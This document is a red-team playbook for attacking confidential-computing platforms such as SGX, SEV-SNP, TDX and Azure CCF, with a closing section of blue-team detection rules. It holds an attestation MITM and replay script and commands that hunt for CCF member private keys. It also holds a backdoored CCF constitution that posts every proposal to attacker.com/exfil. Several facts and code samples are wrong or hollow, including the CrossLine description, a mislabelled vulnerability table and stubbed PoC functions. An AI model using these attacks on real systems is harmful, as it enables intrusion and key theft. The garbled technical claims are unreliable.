# Confidential Computing Attack Playbook

> A practitioner's end-to-end playbook for executing red-team engagements against Trusted Execution Environments (TEEs) — Intel SGX, Intel TDX, AMD SEV-SNP, Azure CCF, Marblerun, and Gramine/Occlum LibOS. Designed for authorized security testing only.

## Table of Contents

1. [Engagement Scoping](#1-engagement-scoping)
2. [Lab Setup](#2-lab-setup)
3. [Reconnaissance Methodology](#3-reconnaissance-methodology)
4. [Attestation Workflow Attacks](#4-attestation-workflow-attacks)
5. [SGX Side-Channel Methodology](#5-sgx-side-channel-methodology)
6. [Enclave ABI Fuzzing](#6-enclave-abi-fuzzing)
7. [SEV-SNP CrossLine & BadRAM](#7-sev-snp-crossline--badram)
8. [Azure CCF Governance Attacks](#8-azure-ccf-governance-attacks)
9. [LibOS Escape Methodology](#9-libos-escape-methodology)
10. [Detection Engineering for Blue Teams](#10-detection-engineering-for-blue-teams)
11. [Reporting Templates](#11-reporting-templates)
12. [Reference Material](#12-reference-material)

---

## 1. Engagement Scoping

### 1.1 In-Scope TEEs (typical)

| TEE | Common scenarios | Typical engagement window |
|---|---|---|
| Intel SGX | Attestation forgery, side channels, sealed secrets, ABI abuse | 5-7 days |
| Intel TDX | VM attestation, TDREPORT tampering | 3-5 days |
| AMD SEV-SNP | Cross-VM isolation, VCEK validation, RMP analysis | 3-5 days |
| AWS Nitro Enclaves | Attestation replay, PCR validation | 2-3 days |
| Azure CCF | Consortium governance, constitution abuse | 3-5 days |
| Marblerun | Manifest tampering, marble policy abuse | 2-3 days |
| Gramine/Occlum | LibOS escape, syscall emulation bugs | 3-5 days |

### 1.2 Authorization Checklist

- [ ] Signed rules of engagement (ROE) naming each TEE
- [ ] Written authorization from CSP if testing in cloud (Azure DCsv3, AWS Nitro)
- [ ] Hardware access (for SGX-Step, Foreshadow PoCs)
- [ ] Specified which secrets are "in-scope" for recovery (e.g., "test keys only")
- [ ] Specified duration of attestation replay captures (e.g., "≤1 hour per session")
- [ ] Named point of contact for each platform team
- [ ] Incident response protocol if production impact detected
- [ ] Post-engagement attestation (TPM-measured) for chain-of-custody
- [ ] Data classification scope (e.g., "test secrets only — no production keys")
- [ ] Side-channel testing window (off-peak only)

### 1.3 Out-of-Scope (typical)

- Production secret recovery (use test keys)
- Hardware destructive testing (no overclock, no overvoltage)
- Physical DIMM tampering (BadRAM lab only)
- Production CCF constitution changes
- Production enclave binary modification
- Cross-customer impact via shared CSP infrastructure

### 1.4 Success Criteria

- Demonstrate at least one full breach chain per TEE
- Provide detection rules for each chain
- Deliver actionable remediation per platform team
- All evidence (traces, quotes, audit logs) packaged for the post-engagement report

---

## 2. Lab Setup

### 2.1 Intel SGX Lab

```bash
# Hardware: SGX-capable Intel CPU (Coffee Lake or newer recommended)
# Cloud: Azure DC-series v2/v3 (Standard_DC4s_v2 or newer)

# Install Intel SGX SDK
sudo apt install build-essential
wget https://download.01.org/intel-sgx/latest/linux-latest/distro/ubuntu20.04-server/sgx_linux_x64_sdk_2.20.100.4.bin
chmod +x sgx_linux_x64_sdk_2.20.100.4.bin
sudo ./sgx_linux_x64_sdk_2.20.100.4.bin

# Install SGX driver
sudo apt install linux-sgx-driver
# Or build from source: https://github.com/intel/linux-sgx-driver

# Verify
ls /dev/isgx /dev/sgx_enclave /dev/sgx_enclave 2>/dev/null

# Install SGX-Step
git clone https://github.com/jovanbulck/sgx-step
cd sgx-step
sudo apt install libcapstone-dev libargp-dev
make

# Test
./app/sgx-step-target --help
```

### 2.2 AMD SEV-SNP Lab

```bash
# Hardware: AMD EPYC Milan (3rd gen) or Genoa (4th gen)
# Cloud: Azure ECads_v5 / AWS (SEV-SNP support varies)

# Install SEV firmware
sudo apt install linux-firmware
sudo modprobe ccp
sudo modprobe kvm_amd sev_snp=1

# Install sev-tool
git clone https://github.com/AMDESE/sev-tool
cd sev-tool
make

# Verify
ls /dev/sev /dev/sev-guest
sudo ./sev-tool --platform_status
```

### 2.3 Intel TDX Lab

```bash
# Hardware: Intel Xeon SP (Sapphire Rapids or newer)
# Cloud: Azure ECes_v5 (TDX preview)

# Install TDX kernel + qemu
sudo apt install linux-image-generic-hwe-22.04
sudo apt install qemu-system-x86

# Verify TDX guest support
ls /dev/tdx-guest 2>/dev/null
dmesg | grep -i tdx

# Build tdquote tool
git clone https://github.com/intel/tdx-tools
cd tdx-tools && make
```

### 2.4 Azure CCF Lab

```bash
# CCF can be installed standalone for testing
sudo apt install ccf

# Start local CCF network (3 nodes)
mkdir ccf-lab && cd ccf-lab
ccf-cli network start \
  --constitution ./js_constitution \
  --members 3 \
  --nodes 3 \
  --output ./workspace

# Submit proposal as member
ccf-cli proposal create \
  --url https://127.0.0.1:8000 \
  --member-key workspace/member0_privk.pem \
  --member-cert workspace/member0_cert.pem \
  --proposal test_proposal
```

### 2.5 AWS Nitro Enclaves Lab

```bash
# Run Nitro Enclaves Development Container
docker run -it --rm \
  --device /dev/nitro_enclaves \
  -v /var/run/nitro_enclaves:/var/run/nitro_enclaves \
  public.ecr.aws/aws-nitro-enclaves/cli:latest

# Build sample enclave
nitro-cli build-enclave \
  --docker-uri hello-world \
  --docker-dir ./docker \
  --output-file hello.eif

# Run enclave
nitro-cli run-enclave \
  --eif-path hello.eif \
  --cpu-count 2 \
  --memory 1024
```

### 2.6 Marblerun Lab

```bash
# Install edgelessrt (Marblerun SDK)
wget https://github.com/edgelesssys/edgelessrt/releases/download/v1.2.0/edgelessrt_1.2.0_amd64.deb
sudo dpkg -i edgelessrt_1.2.0_amd64.deb

# Install Marblerun CLI
wget https://github.com/edgelesssys/marblerun/releases/latest/download/marblerun-cli
chmod +x marblerun-cli
sudo mv marblerun-cli /usr/local/bin/marblerun

# Start local Marblerun
marblerun install
```

### 2.7 Gramine Lab

```bash
# Install Gramine
sudo apt install gramine

# Build sample app
mkdir gramine-lab && cd gramine-lab
cat > hello.c <<'EOF'
#include <stdio.h>
int main() { printf("Hello from Gramine!\n"); return 0; }
EOF
gcc hello.c -o hello

# Create manifest
cat > hello.manifest <<'EOF'
loader.entry = "file:./hello"
sgx.enclave_size = "256M"
sgx.thread_num = 4
EOF

# Sign and run
gramine-sgx-sign --manifest hello.manifest --output hello.manifest.sgx \
  --key REPLACE_WITH_YOUR_KEY
gramine-sgx ./hello
```

---

## 3. Reconnaissance Methodology

### 3.1 Identify TEE Usage in Production Binary

```bash
# Static binary analysis
objdump -d target.so | grep -E "(enclu|encls|enclv)" | head
nm -D target.so | grep -iE "(sgx_|ecall_|ocall_)"
strings target.so | grep -iE "(MRENCLAVE|MRSIGNER|sev_|tdx_|ccf_|marblerun)"

# Intel-specific:
strings target.so | grep -iE "(ias|dcap|epid|qe|pce)"
# AMD-specific:
strings target.so | grep -iE "(vcek|snp|sev-es|vmsa)"
# CCF-specific:
strings target.so | grep -iE "(ccf|consortium|constitution)"
```

### 3.2 Identify Attestation Provider

```bash
# Network traffic analysis
tcpdump -i any -A 'tcp port 443 and host <attestation_endpoint>'

# Common endpoints:
# Intel IAS: https://api.trustedservices.intel.com/sgx/dev/attestation/v3/
# Intel DCAP: https://api.trustedservices.intel.com/sgx/certification/v3/
# AMD KDS: https://kdsintf.amd.com/vcek/v1/Milan/
# Azure Attestation: https://attest.azure.net/
# AWS Nitro: in-enclave NSM device

# Configuration discovery
grep -rE "(trustedservices|kdsintf|attest.azure|attest.aws)" /etc /opt 2>/dev/null
```

### 3.3 Map Enclave Binary

```bash
# Extract SGX metadata
sgx_sign dump \
  -key REPLACE_WITH_YOUR_KEY \
  -enclave target.so \
  -dumpfile metadata.txt

# Inspect metadata.txt for:
# - MRENCLAVE (enclave measurement)
# - MRSIGNER (signing key hash)
# - ISVPRODID, ISVSVM
# - Security version numbers
# - Advisory allowlist

# Find ECALLs and OCALLs
nm target.so | grep -E "(ecall|ocall)"
# ecall_class_encrypt, eclass_decrypt, ecall_run_query

# Inspect EDL file (if available)
cat Enclave.edl
```

### 3.4 Cloud Platform Discovery

```bash
# Azure DC-series VM detection
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/instance?api-version=2023-07-01" | \
  jq '.compute.vmSize'
# Returns: "Standard_DC4s_v2" (SGX), "Standard_EC4s_v5" (TDX)

# AWS Nitro Enclaves
ls /dev/nitro_enclaves/ 2>/dev/null

# GCP Confidential Space
curl -s -H Metadata:true \
  "http://metadata.google.internal/computeMetadata/v1/instance/confidential-instance-config"

# CSP-side attestation info
ls /sys/devices/platform/*tee* /sys/class/*tee* 2>/dev/null
```

---

## 4. Attestation Workflow Attacks

### 4.1 Capture Attestation Quote

```python
# MITM proxy between client and verifier
import socket, threading

class AttestationProxy:
    def __init__(self, listen_port, verifier_addr):
        self.listen_port = listen_port
        self.verifier_addr = verifier_addr
        self.captured = []

    def handle(self, client_sock):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect(self.verifier_addr)

        def forward(src, dst):
            while True:
                data = src.recv(8192)
                if not data: break
                if b'quote' in data:
                    self.captured.append(data)
                dst.sendall(data)

        threading.Thread(target=forward, args=(client_sock, server_sock)).start()
        threading.Thread(target=forward, args=(server_sock, client_sock)).start()

# Run proxy
proxy = AttestationProxy(8000, ('verifier.target', 443))
# ... accept loop
```

### 4.2 Replay Captured Quote

```python
# Replay attack
import requests

# Load captured quote
with open('captured_quote.bin', 'rb') as f:
    quote = f.read()

# Send to verifier
r = requests.post('https://verifier.target/attest',
                   data={'quote': quote.hex(), 'nonce': 'original_nonce'})

# Hardened verifier rejects:
# - "Stale quote: timestamp outside window"
# - "Nonce mismatch"
# - "Quote already consumed"

# Weak verifier accepts stale quote
```

### 4.3 Forge Advisory Bypass

```python
# If target enclave has vulnerable ISVSVN and verifier allows vulnerable advisories
# Submit vulnerable quote

vulnerable_quote = {
    "isvsvn": 1,  # Pre-patch version
    "mrenclave": "...",
    "advisories": ["INTEL-SA-00219", "INTEL-SA-00320"]
}

# Verifier policy
def vulnerable_verify(quote):
    # Allow-list includes vulnerable advisories
    ALLOWED = ["INTEL-SA-00219", "INTEL-SA-00320", "INTEL-SA-00614"]
    for adv in quote.advisories:
        if adv not in ALLOWED:
            return False
    return True  # accepts vulnerable quote

def hardened_verify(quote):
    BLOCKED = ["INTEL-SA-00219", "INTEL-SA-00320"]
    for adv in quote.advisories:
        if adv in BLOCKED:
            return False
    return True
```

### 4.4 AMD SEV-SNP Attestation Audit

```python
# Parse SEV-SNP attestation report
import struct

def parse_snp_report(report_bytes):
    # Layout (simplified — full report is 0x1000 bytes)
    version, guest_svn, policy = struct.unpack_from('<IIQ', report_bytes, 0)
    family_id = report_bytes[16:32]
    image_id = report_bytes[32:48]
    vmpl, sig_algo = struct.unpack_from('<II', report_bytes, 48)
    platform_version = report_bytes[56:60]
    report_data = report_bytes[80:144]  # nonce
    measurement = report_bytes[144:192]  # guest measurement
    return {
        'version': version,
        'guest_svn': guest_svn,
        'policy': policy,
        'vmpl': vmpl,
        'report_data': report_data.hex(),
        'measurement': measurement.hex(),
    }

# Verify
import subprocess
subprocess.run([
    'sev-tool', '--verify_snp_report',
    '--report', 'report.bin',
    '--vcek', 'vcek.pem'
])
```

### 4.5 TDX TDREPORT Verification

```python
# TDX attestation report (TDREPORT)
import struct

def parse_tdreport(report_bytes):
    # Layout (1024 bytes):
    td_uuid = report_bytes[0:16]
    td_attributes = report_bytes[16:24]
    mrtd_meas = report_bytes[40:88]
    mrtd_signer = report_bytes[88:136]
    report_data = report_bytes[432:496]  # nonce

    return {
        'td_uuid': td_uuid.hex(),
        'mrtd_meas': mrtd_meas.hex(),
        'report_data': report_data.hex(),
        'debug_flag': bool(td_attributes[0] & 0x02),
    }

# Verifier checks
def verify_tdreport(report, expected_nonce, expected_mrtd):
    if report.report_data != expected_nonce:
        return False
    if report.debug_flag:
        return False
    if report.mrtd_meas != expected_mrtd:
        return False
    return True
```

---

## 5. SGX Side-Channel Methodology

### 5.1 Identify Secret-Dependent Branches

```c
// In enclave code, look for patterns like:
int check_password(const char *input, const char *secret, int len) {
    for (int i = 0; i < len; i++) {
        if (input[i] != secret[i]) {
            return 0;  // ← early return: secret-dependent
        }
    }
    return 1;
}

// This leaks via instruction-count side channel:
// - Correct first byte: longer execution
// - Incorrect first byte: shorter execution
```

### 5.2 Deploy SGX-Step Single-Step Trace

```bash
# Build target with SGX-Step
cd sgx-step
make

# Run with single-step
./app/sgx-step-target --single-step --secret "REPLACE_WITH_YOUR_TEST_SECRET"
# Output: per-instruction trace

# Analyze
python3 analyze_trace.py trace.txt
```

### 5.3 Cache Timing Side Channel

```python
# Flush+Reload attack
import time

CACHE_LINE = 64

def flush(addr):
    # Use clflush instruction (via ctypes)
    pass

def probe(addr):
    start = time.perf_counter_ns()
    # Load from addr
    pass
    end = time.perf_counter_ns()
    return end - start

# Attack:
# 1. Flush secret-dependent address
# 2. Trigger enclave execution
# 3. Probe address — fast access = branch was taken
```

### 5.4 Foreshadow (L1TF) PoC

```c
// Foreshadow PoC structure (academic, simplified)
// Reference: https://foreshadowattack.eu/

#include <stdint.h>

uint8_t foreshadow_read(uint64_t phys_addr) {
    // Step 1: Set PTE present bit to 0
    unset_pte_present(phys_addr);

    // Step 2: Trigger enclave access to physical address
    // (this fails, but L1 cache contains stale data)
    trigger_enclave_load(phys_addr);

    // Step 3: Use transient execution to read stale L1 data
    // Via Meltdown-style gadget
    return transient_read_l1(phys_addr);
}
```

### 5.5 LVI (Load Value Injection)

```c
// LVI attack structure
// Reference: https://lviattack.eu/

void lvi_attack(uint64_t faulting_addr) {
    // Step 1: Configure PTE for faulting_addr to fault
    set_pte_fault(faulting_addr);

    // Step 2: Trigger enclave that loads from faulting_addr
    // (load fails, but microarchitectural state contains attacker data)

    // Step 3: Enclave uses attacker-controlled data
    // (e.g., indirect branch uses attacker value)
}
```

### 5.6 ÆPIC Leak (APIC MMIO)

```c
// ÆPIC Leak PoC
// Reference: https://aepicleak.com/

#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

uint8_t read_apic_mmio(volatile uint8_t *apic_addr, int offset) {
    return apic_addr[offset];
}

// Map APIC MMIO region
volatile uint8_t *apic = mmap(NULL, 4096,
    PROT_READ, MAP_SHARED, fd, 0xFEE00000);

// Repeatedly read APIC MMIO — some reads return stale SGX data
for (int i = 0; i < 1000; i++) {
    uint8_t leaked = read_apic_mmio(apic, i);
    if (leaked != 0xFF) {
        printf("Leaked byte at offset %d: 0x%02x\n", i, leaked);
    }
}
```

---

## 6. Enclave ABI Fuzzing

### 6.1 Identify ECALLs

```bash
# From EDL file
cat Enclave.edl | grep -E "^\s*public\s"
# public void eclass_encrypt([in, size=len] uint8_t *plaintext, [out, size=len] uint8_t *ciphertext, size_t len);

# From compiled binary
nm target.so | grep -E "ecall_"
```

### 6.2 Fuzz ECALLs

```c
// AFL harness
#include "/path/to/enclave_u.h"

int main(int argc, char **argv) {
    sgx_enclave_id_t eid;
    sgx_launch_token_t token = {0};

    // Create enclave
    sgx_create_enclave("enclave.signed.so", SGX_DEBUG_FLAG, &token, NULL, &eid, NULL);

    // Fuzz input
    char buf[1024];
    size_t len = read(0, buf, sizeof(buf));

    char output[1024];
    ecall_class_encrypt(eid, buf, output, len);
    return 0;
}
```

### 6.3 Detect Untrusted Pointer Bugs

```c
// Bug: ecall uses [user_check] parameter (no copy, no validation)
// EDL:
// public void vuln_ecall([user_check] uint8_t *controlled_ptr, size_t len);

// Attack: pass pointer to enclave-protected memory
uint8_t *attack = (uint8_t *)enclave_secret_address;
vuln_ecall(global_eid, attack, len);

// If vuln_ecall dereferences attack without sgx_is_within_enclave check
// → enclave reads/writes attacker-controlled memory location
```

### 6.4 Detect AEX Races

```c
// Race pattern:
// 1. Enclave reads counter
// 2. AEX fires (timer interrupt)
// 3. Attacker modifies counter in untrusted memory
// 4. Enclave resumes with stale read, writes stale value

// Detect via:
// - SGX-Step's AEX notify
// - Single-step trace looking for non-atomic RMW

// Defense:
// - Use atomic operations
// - Disable interrupts during critical sections
// - Use Intel TSX for transactional atomicity
```

---

## 7. SEV-SNP CrossLine & BadRAM

### 7.1 CrossLine Attack

```python
# CrossLine attack (USENIX Security 2025)
# Breaks VMPL-based isolation between VMs on same SEV-SNP platform

# Prerequisites:
# - Two VMs (VM-A attacker, VM-B victim) on same SEV-SNP platform
# - VM-A has VMPL3 (highest privilege within guest)
# - VM-B also has VMPL3

# Attack flow:
# 1. VM-A issues VMGEXIT to request VMPL transition
# 2. Hypervisor (in VMPL0) may incorrectly allow cross-VM access
# 3. VM-A reads VM-B's memory via aliased RMP entries
# 4. Or, VM-A spoofs VMPL to read VM-B's TCB

# Defense:
# - CSP scheduling: never co-locate mutually-untrusted VMs
# - Hypervisor enforces VMPL boundaries
# - Monitor for VMGEXIT anomalies
```

### 7.2 BadRAM Attack

```python
# BadRAM attack (USENIX Security 2024)
# Exploits DDR5 SPD (Serial Presence Detect) bypass

# Prerequisites:
# - Physical access to DRAM slots (lab / evil-maid scenarios)
# - DDR5 DIMM with mutable SPD EEPROM

# Attack flow:
# 1. Modify SPD EEPROM on DIMM to report incorrect size (e.g., 32GB → 16GB actual)
# 2. CPU maps DIMM as 32GB
# 3. Memory accesses above 16GB alias back to lower addresses
# 4. SEV-SNP's RMP doesn't catch the aliasing
# 5. Attacker can modify victim VM's "32GB" memory via aliased "lower 16GB"

# Defense:
# - DDR5 DIMMs with cryptographic SPD authentication
# - CSP physical security
# - SEV-SNP firmware with RMP re-validation
```

---

## 8. Azure CCF Governance Attacks

### 8.1 Network Discovery

```bash
# CCF exposes public governance endpoints
curl -s https://ccf.target.example/node/network | jq
curl -s https://ccf.target.example/node/constitution | jq
curl -s https://ccf.target.example/gov/members | jq
curl -s https://ccf.target.example/gov/proposals | jq
```

### 8.2 Member Key Discovery

```bash
# Look for member private keys
find / -name "*member*priv*" 2>/dev/null
find / -name "*member*pem*" 2>/dev/null

# Common locations:
# /opt/ccf/member/privk.pem
# /etc/ccf/member/privk.pem
# Env var: CCF_MEMBER_PRIV_KEY
# CI/CD secrets manager

# CI/CD dorks
grep -r "MEMBER_PRIV_KEY" /etc /opt 2>/dev/null
gh search code "CCF_MEMBER_PRIV_KEY" --owner target
```

### 8.3 Submit Malicious Proposal

```bash
# Submit proposal to add attacker as operator
ccf-cli proposal create \
  --url https://ccf.target.example \
  --member-key member_privk.pem \
  --member-cert member_cert.pem \
  --proposal allow_new_member \
  --param '{"cert":"<attacker_cert_pem>","member_data":{"role":"operator"}}'

# Wait for quorum votes
# If passed: attacker becomes operator with full governance rights
```

### 8.4 Constitution Backdoor

```javascript
// Attacker constitution (backdoor)
export function vote(rawVote, proposalId) {
  const vote = parseVote(rawVote);

  // Backdoor: always accept attacker's vote
  if (vote.member === "ATTACKER_MEMBER_ID") {
    return true;
  }

  // Normal vote logic
  return validateVote(vote, proposalId);
}

export function apply(proposal, proposalId) {
  // Backdoor: log all proposals to external endpoint
  fetch("https://attacker.com/exfil", {method: "POST", body: JSON.stringify(proposal)});

  // Normal apply
  return defaultApply(proposal, proposalId);
}
```

### 8.5 Submit Constitution Change

```bash
ccf-cli proposal create \
  --url https://ccf.target.example \
  --member-key member_privk.pem \
  --proposal set_constitution \
  --param '{"constitution":"<attacker_constitution_js_base64>"}'

# Quorum votes → constitution is replaced
# All subsequent governance runs attacker code
```

---

## 9. LibOS Escape Methodology

### 9.1 Gramine Recon

```bash
# Inspect manifest
cat app.manifest

# Trace syscalls
gramine-sgx --log-file=gramine.log --syslog-level=debug ./app
grep "syscall" gramine.log | head -50

# Inspect trusted files
gramine-manifest --signature-verification-only app.manifest
```

### 9.2 Gramine Syscall Emulation Bugs

```c
// Historical bug patterns in Gramine:
// 1. open() with O_CREAT on trusted file → host file created without manifest entry
// 2. mmap() with PROT_EXEC on untrusted file → code execution from host
// 3. ioctl() with arbitrary arg → libos confusion
// 4. Race condition in dispatch table
// 5. FD table overflow

// Test pattern:
// 1. Set up enclave
// 2. Fuzz each emulated syscall
// 3. Look for: unexpected file creation, code execution outside enclave
```

### 9.3 AFL Fuzzing Harness

```bash
# Build target with Gramine
gramine-sgx-sign --manifest app.manifest --output app.manifest.sgx \
  --key REPLACE_WITH_YOUR_KEY

# Run under AFL
afl-fuzz -i input/ -o output/ -- \
  gramine-sgx-direct ./app @@
```

### 9.4 Occlum Recon

```bash
# Inspect Occlum.json
cat Occlum.json | jq

# Build and run
occlum build
occlum run /bin/app

# Inspect process inside Occlum
occlum exec /bin/sh
ls /host  # ← access to host files (sometimes unintentional)
```

---

## 10. Detection Engineering for Blue Teams

### 10.1 SGX Sigma Rule for Side-Channel

```yaml
title: SGX AEX Anomaly
id: 9c2f9c2a-...
status: experimental
description: Detects abnormal SGX AEX count indicating single-step attack
logsource:
  product: linux
  service: sgx-perf
detection:
  selection:
    aex_count_per_second: ">1000"
  condition: selection
level: high
```

### 10.2 SEV-SNP RMP Violation Detection (Splunk SPL)

```spl
index=os sourcetype=var_log
  "SEV-SNP RMP violation" OR "RMP_NOTVALID"
| stats count by host, _time
| where count > 10
```

### 10.3 CCF Constitution Change Detection (KQL)

```kusto
CCFAuditLogs
| where actionName == "set_constitution"
| project TimeGenerated, memberName, constitutionHash, prevHash
| where constitutionHash != prevHash
```

### 10.4 CCF New Member Proposal Detection (Sigma)

```yaml
title: CCF New Member Proposal
id: 8d3a9d3b-...
logsource:
  product: azure
  service: ccf
detection:
  selection:
    operation: "allow_new_member"
  condition: selection
level: medium
```

### 10.5 AWS Nitro PCR Mismatch Detection (Splunk)

```spl
index=aws sourcetype=aws:cloudtrail
  eventName="DescribeEnclaves"
| parse responseElements as response
| where response.PCR0 != expected_PCR0
| stats count by eventName, response.PCR0
```

### 10.6 Marblerun Manifest Tamper Detection (KQL)

```kusto
MarblerunAuditLogs
| where operation == "manifest_update"
| project TimeGenerated, manifestHash, prevHash
| where manifestHash != prevHash
```

### 10.7 Universal — Attestation Provider Anomaly

```kusto
AttestationLogs
| summarize count() by clientIP, attestationMethod
| where clientIP !in (allowedClientIPs)
| sort by count_ desc
```

---

## 11. Reporting Templates

### 11.1 Per-Finding Template

```markdown
## Finding X: <Title>

**Severity**: CRITICAL / HIGH / MEDIUM / LOW
**TEE**: SGX / SEV-SNP / TDX / CCF / Marblerun / Nitro
**Target**: <REDACTED identifier>
**Window**: YYYY-MM-DD HH:MM UTC

### Description
<1-2 paragraph technical summary>

### Attack Chain
1. <step 1>
2. <step 2>
3. <step 3>

### Evidence
- Enclave binary: <hash>
- Side-channel trace: <path>
- Attestation quote: <hash>
- Audit log entry: <REDACTED>

### Impact
- <secrets exposed>
- <TEE isolation violated>
- <attestation integrity broken>

### Remediation
1. <short-term>
2. <medium-term>
3. <long-term>

### Detection Rule
<sigma/spl/kql query — see Section 10>

### References
- MITRE ATT&CK: <technique>
- CVE: <CVE-ID>
- Academic paper: <reference>
```

### 11.2 Executive Summary Template

```markdown
## Executive Summary

Between <START> and <END>, the red team executed an authorized assessment of
<TARGET>'s confidential computing security posture. The assessment covered
<TEEs> and identified <N> critical findings, <M> high findings, and <P>
medium findings.

### Key Findings

1. **SGX attestation replay** — relying party accepted stale quotes without
   nonce validation
2. **CCF consortium quorum weakness** — 2 of 3 members sufficient for
   constitution changes
3. **Gramine syscall emulation bug** — allowed host file creation via O_CREAT
   race

### Business Impact

- **Customer data**: <X> records potentially exposed via attestation forgery
- **Compliance**: <confidential computing> promises violated
- **Financial**: Estimated $<amount> exposure based on <data classification>

### Recommendations

1. **Hardening** — deploy attestation replay defenses within 30 days
2. **Quorum reform** — increase CCF quorum to 4 of 7 within 60 days
3. **Patching** — apply Gramine security updates
4. **Detection engineering** — implement the 7 detection rules in Section 10

### Strategic Direction

<2-3 paragraph strategic context>
```

---

## 12. Reference Material

### 12.1 Key Vulnerabilities (2024-2025)

| CVE / Name | Year | TEE | Pattern |
|---|---|---|---|
| Foreshadow (CVE-2018-3615) | 2018 | SGX | L1TF side-channel |
| Foreshadow-NG | 2018 | SGX | L1TM in VM |
| SGAxe (CVE-2020-0549) | 2020 | SGX | EPID key extraction |
| LVI (CVE-2020-0551) | 2020 | SGX | Load value injection |
| ÆPIC Leak (CVE-2022-21233) | 2022 | SGX | APIC MMIO read |
| BadRAM | 2024 | SEV-SNP | DDR5 SPD bypass |
| CrossLine | 2025 | SEV-SNP | VMPL misuse |
| TDX-003 | 2024 | TDX | TDREPORT validation |

### 12.2 Vendor Documentation

- **Intel SGX**: https://www.intel.com/sgx
- **Intel TDX**: https://www.intel.com/tdx
- **AMD SEV-SNP**: https://www.amd.com/sev
- **Azure CCF**: https://microsoft.github.io/CCF/
- **AWS Nitro Enclaves**: https://aws.amazon.com/ec2/nitro/nitro-enclaves/
- **Marblerun**: https://edgeless.systems/docs/
- **Gramine**: https://gramineproject.io/
- **Occlum**: https://github.com/occlum/occlum

### 12.3 Academic References

- *Foreshadow: Masters of SGX* — Van Bulck et al., USENIX Security 2018
- *SGAxe: Stealing the SGX Attestation Key* — Van Bulck et al., CCS 2020
- *LVI: Hijacking Transient Execution* — Van Bulck et al., IEEE S&P 2020
- *ÆPIC Leak* — CVE-2022-21233 Analysis, BlackHat USA 2022
- *CrossLine: Breaking SEV-SNP VM Isolation* — USENIX Security 2025
- *BadRAM: DDR5 SPD Bypass* — USENIX Security 2024

### 12.4 Tooling References

| Tool | Purpose | License |
|---|---|---|
| sgx-step | Single-step SGX tracing | academic |
| sgvisor | SGX hypervisor research | academic |
| sev-tool | SEV/SEV-SNP attestation | Apache 2.0 |
| marblerun-cli | Marblerun management | Apache 2.0 |
| ccf-cli | CCF governance | MIT |
| gramine-direct | Gramine direct runner | LGPL |
| occlum-tools | Occlum toolset | MPL-2.0 |
| intel-sgx-sdk | SGX SDK | BSD-3-Clause |
| sgxs-tools | Rust SGX utilities | Apache 2.0 |

### 12.5 Glossary

- **AEX** — Asynchronous Enclave Exit (interrupt during enclave execution)
- **DCAP** — Data Center Attestation Primitives (Intel ECDSA-based attestation)
- **ECALL** — Enclave Call (host → enclave)
- **EDL** — Enclave Definition Language (Intel)
- **EPID** — Enhanced Privacy ID (Intel legacy attestation)
- **IAS** — Intel Attestation Service
- **KDS** — AMD Key Distribution Service
- **MRENCLAVE** — Enclave measurement (hash of enclave code + config)
- **MRSIGNER** — Hash of enclave signing key
- **NSM** — Nitro Secure Module (AWS)
- **OCALL** — Outgoing Call (enclave → host)
- **PCR** — Platform Configuration Register (AWS Nitro)
- **QE** — Quoting Enclave (Intel SGX)
- **RMP** — Reverse Map (AMD SEV-SNP page metadata)
- **SEV-SNP** — Secure Encrypted Virtualization - Secure Nested Paging
- **TDX** — Trust Domain Extensions (Intel)
- **TEE** — Trusted Execution Environment
- **VCEK** — Versioned Chip Endorsement Key (AMD SEV-SNP)
- **VMPL** — Virtual Machine Privilege Level (SEV-SNP)
